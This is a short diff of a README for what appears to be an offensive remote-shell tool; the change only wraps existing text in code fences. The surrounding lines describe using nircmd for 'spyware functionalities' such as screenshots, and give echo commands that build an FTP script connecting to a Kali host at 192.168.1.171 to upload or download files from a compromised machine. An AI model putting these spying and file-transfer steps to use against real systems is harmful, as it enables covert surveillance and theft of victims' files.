@@ -41,6 +41,7 @@ To gain spyware functionalities you can use nircmd: https://www.nirsoft.net/util
 nircmd.exe savescreenshot screen1.png
 
 ## ftp echos to Download files change put for get to Upload (This is done client side on the Shell)
+```sh
 echo open 192.168.1.171> ftp.txt
 echo kali>> ftp.txt
 echo kali>> ftp.txt
@@ -55,7 +56,7 @@ kali
 kali
 put P1010975.JPG
 bye
-
+```
 ## License
 Open Source<br>
 **Free Software, Hell Yeah!**
